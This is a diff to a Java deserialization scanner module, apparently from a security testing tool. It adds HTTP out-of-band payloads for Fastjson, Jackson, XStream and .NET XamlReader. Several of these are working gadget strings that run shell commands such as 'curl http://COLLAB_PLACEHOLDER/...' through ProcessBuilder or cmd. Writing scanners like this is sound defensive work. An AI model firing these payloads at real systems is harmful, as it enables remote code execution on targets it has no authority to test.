@@ -194,7 +194,9 @@ public class DeserializationScanner implements ScanModule {
     };
 
     // Java sub-framework active payloads — Fastjson, Jackson, XStream, SnakeYAML
+    // Each framework has LDAP/DNS payloads (Burp Collaborator) AND HTTP payloads (Custom OOB compatible)
     private static final String[][] JAVA_FASTJSON_PAYLOADS = {
+            // LDAP-based (Burp Collaborator — requires DNS resolution)
             {"Fastjson JdbcRowSetImpl",
                     "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}"},
             {"Fastjson TemplatesImpl",
@@ -207,11 +209,23 @@ public class DeserializationScanner implements ScanModule {
                     "{\"@type\":\"sun.print.UnixPrintServiceLookup\",\"defaultPrinter\":\"nslookup COLLAB_PLACEHOLDER\"}"},
             {"Fastjson 1.2.68+ expectClass",
                     "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/d\",\"autoCommit\":true}"},
+            // HTTP-based (Custom OOB compatible)
             {"Fastjson LdapAttribute",
                     "{\"@type\":\"com.sun.jndi.ldap.LdapAttribute\",\"val\":{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/e\"}}"},
+            {"Fastjson URL",
+                    "{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/fastjson\"}"},
+            {"Fastjson InetAddress",
+                    "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"http://COLLAB_PLACEHOLDER/fastjson2\"}}"},
+            {"Fastjson JdbcRowSetImpl HTTP",
+                    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"http://COLLAB_PLACEHOLDER/fastjson3\",\"autoCommit\":true}"},
+            {"Fastjson BasicDataSource HTTP",
+                    "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"http://COLLAB_PLACEHOLDER/fastjson4\"}"},
+            {"Fastjson JndiDataSourceFactory HTTP",
+                    "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"http://COLLAB_PLACEHOLDER/fastjson5\"}}"},
     };
 
     private static final String[][] JAVA_JACKSON_PAYLOADS = {
+            // LDAP-based (Burp Collaborator)
             {"Jackson JdbcRowSetImpl",
                     "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}]"},
             {"Jackson TemplatesImpl",
@@ -222,9 +236,19 @@ public class DeserializationScanner implements ScanModule {
                     "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://COLLAB_PLACEHOLDER/c\",\"propertyPath\":\"x\"}]"},
             {"Jackson LogbackJndi",
                     "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://COLLAB_PLACEHOLDER/d\"}]"},
+            // HTTP-based (Custom OOB compatible)
+            {"Jackson JdbcRowSetImpl HTTP",
+                    "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"http://COLLAB_PLACEHOLDER/jackson\",\"autoCommit\":true}]"},
+            {"Jackson C3P0 HTTP",
+                    "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"http://COLLAB_PLACEHOLDER/jackson2\",\"loginTimeout\":0}]"},
+            {"Jackson SpringAbstractBeanFactory HTTP",
+                    "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"http://COLLAB_PLACEHOLDER/jackson3\",\"propertyPath\":\"x\"}]"},
+            {"Jackson LogbackJndi HTTP",
+                    "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"http://COLLAB_PLACEHOLDER/jackson4\"}]"},
     };
 
     private static final String[][] JAVA_XSTREAM_PAYLOADS = {
+            // DNS-based (Burp Collaborator)
             {"XStream ProcessBuilder",
                     "<java.lang.ProcessBuilder><command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command></java.lang.ProcessBuilder>"},
             {"XStream EventHandler",
@@ -240,6 +264,17 @@ public class DeserializationScanner implements ScanModule {
                             + "<target class=\"java.lang.ProcessBuilder\">"
                             + "<command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command>"
                             + "</target><action>start</action></handler></dynamic-proxy></sorted-set>"},
+            // HTTP-based (Custom OOB compatible)
+            {"XStream ProcessBuilder curl",
+                    "<java.lang.ProcessBuilder><command><string>/bin/sh</string><string>-c</string><string>curl http://COLLAB_PLACEHOLDER/xstream</string></command></java.lang.ProcessBuilder>"},
+            {"XStream EventHandler curl",
+                    "<dynamic-proxy><interface>java.lang.Comparable</interface>"
+                            + "<handler class=\"java.beans.EventHandler\">"
+                            + "<target class=\"java.lang.ProcessBuilder\">"
+                            + "<command><string>/bin/sh</string><string>-c</string><string>curl http://COLLAB_PLACEHOLDER/xstream2</string></command>"
+                            + "</target><action>start</action></handler></dynamic-proxy>"},
+            {"XStream URL",
+                    "<java.net.URL><string>http://COLLAB_PLACEHOLDER/xstream3</string></java.net.URL>"},
             {"XStream ImageIO",
                     "<java.util.PriorityQueue serialization=\"custom\">"
                             + "<unserializable-parents/><java.util.PriorityQueue>"
@@ -359,7 +394,7 @@ public class DeserializationScanner implements ScanModule {
 
     // .NET XML/XAML deserialization payloads
     private static final String[][] DOTNET_XML_PAYLOADS = {
-            // XamlReader.Load payload
+            // XamlReader.Load payload — DNS (Burp Collaborator)
             {"XamlReader.Load",
                     "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
                             + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
@@ -369,6 +404,17 @@ public class DeserializationScanner implements ScanModule {
                             + "<ObjectDataProvider.MethodParameters>"
                             + "<System:String>cmd</System:String>"
                             + "<System:String>/c nslookup COLLAB_PLACEHOLDER</System:String>"
+                            + "</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>"},
+            // XamlReader.Load payload — HTTP (Custom OOB compatible)
+            {"XamlReader.Load curl",
+                    "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
+                            + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
+                            + "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" "
+                            + "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">"
+                            + "<ObjectDataProvider x:Key=\"\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">"
+                            + "<ObjectDataProvider.MethodParameters>"
+                            + "<System:String>cmd</System:String>"
+                            + "<System:String>/c curl http://COLLAB_PLACEHOLDER/xaml</System:String>"
                             + "</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>"},
             // DataContractSerializer XXE
             {"DataContractSerializer XXE",
@@ -2133,7 +2179,7 @@ public class DeserializationScanner implements ScanModule {
 
             if (collabPayload == null) continue;
 
-            String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);
+            String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);
 
             // Fix PHP serialized string lengths after COLLAB_PLACEHOLDER replacement.
             // PHP unserialize() requires exact byte lengths in s:XX:"..." format.
